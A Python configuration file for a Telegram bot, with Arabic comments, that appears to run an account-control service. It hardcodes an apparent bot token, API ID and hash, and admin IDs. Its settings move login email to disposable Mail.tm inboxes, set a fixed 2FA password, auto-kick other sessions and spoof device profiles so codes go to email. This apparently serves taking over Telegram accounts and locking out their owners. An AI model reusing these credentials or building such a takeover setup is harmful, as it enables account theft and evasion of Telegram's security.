# config.py
import os
from dotenv import load_dotenv

load_dotenv()

BOT_TOKEN = os.getenv("BOT_TOKEN", "8990980316:AAGtdDq2USPMtXUOFLUeRvnTNy9pyS59WyE")
API_ID = int(os.getenv("API_ID", "37698652"))
API_HASH = os.getenv("API_HASH", "58b8a290e85dd6e57127270d937a1832")
REGISTRATION_LINK = os.getenv("REGISTRATION_LINK", "https://vimeo.com/1182266152?fl=pl&fe=cm")

# --- Mail.tm (بريد Login) ---
MAILTM_API_BASE = "https://api.mail.tm"
EMAIL_MIGRATION_DELAY = 1.5

# إنعاش جلسة منتهية: انتظار ثم طلب كود عبر بريد Login (ثوانٍ)
SESSION_RECOVERY_DELAY = 300
# محاولات إنعاش قبل تصنيف «غير صالحة» + إعادة فحص الجلسات غير الصالحة
SESSION_RECOVERY_MAX_ATTEMPTS = 3
SESSION_RECOVERY_RETRY_DELAY = 300
INVALID_SESSION_RESCAN_INTERVAL = 900

# نظام الطرد التلقائي: فوراً → 24 ساعة → كل 5 دقائق حتى ينجح
AUTO_KICK_DELAY_24H = 86400
AUTO_KICK_DELAY_RETRY = 300

# كلمة مرور 2FA الافتراضية (تنظيف شامل + خط التأمين + الإنعاش)
DEFAULT_2FA_PASSWORD = "054321"

# بصمة جهاز (تقليل SentCodeTypeApp — يفضّل وصول الكود للبريد)
TELEGRAM_LANG_CODE = "en"
TELEGRAM_SYSTEM_LANG_CODE = "en-US"
TELEGRAM_DEVICE_PROFILES = [
    {
        "device_model": "POCO X3 Pro",
        "system_version": "SDK 33",
        "app_version": "10.14.5 (4658)",
        "lang_code": "en",
        "system_lang_code": "en-US",
    },
    {
        "device_model": "Samsung SM-S911B",
        "system_version": "SDK 34",
        "app_version": "11.4.2 (55192)",
        "lang_code": "en",
        "system_lang_code": "en-US",
    },
    {
        "device_model": "Redmi Note 12 Pro",
        "system_version": "SDK 33",
        "app_version": "10.13.4 (4512)",
        "lang_code": "en",
        "system_lang_code": "en-US",
    },
]

# إعادة إرسال كود الإنعاش حتى يصل كـ Email
RECOVERY_CODE_RESEND_ATTEMPTS = 18
RECOVERY_CODE_RESEND_INTERVAL = 4

# Watchdog: فحصان متتاليان فاشلان قبل إشعار «الجلسة توقفت»
WATCHDOG_DEAD_STREAK = 2

_A1 = 8357381411
SUPER_ADMIN_ID = int(os.getenv("SUPER_ADMIN_ID", str(_A1)))  # أدمن رقم 1 — صلاحيات ⭐ و Volume وفحص الجلسات

# قائمة الأدمنز: تُقرأ من البيئة كنص مفصول بفاصلة (مثال: "123,456,789")
_ADMIN_IDS_STR = os.getenv("ADMIN_IDS", f"{_A1},7343365087,8185311198,8114219256")
ADMIN_IDS = [int(i.strip()) for i in _ADMIN_IDS_STR.split(",") if i.strip().isdigit()]
